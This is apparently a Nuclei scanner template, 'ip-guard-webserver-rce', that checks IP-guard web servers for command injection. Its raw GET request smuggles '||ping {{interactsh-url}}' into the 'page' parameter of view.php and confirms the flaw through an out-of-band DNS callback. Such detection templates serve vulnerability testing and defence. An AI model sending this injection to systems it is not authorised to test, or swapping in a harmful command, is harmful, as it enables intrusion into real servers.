http:
    - extractors:
        - kval:
            - interactsh_ip
          type: kval
      matchers:
        - part: interactsh_protocol
          type: word
          words:
            - dns
      matchers-condition: and
      raw:
        - |
          GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{{interactsh-url}} HTTP/1.1
          Host: {{Hostname}}
id: ip-guard-webserver-rce
info:
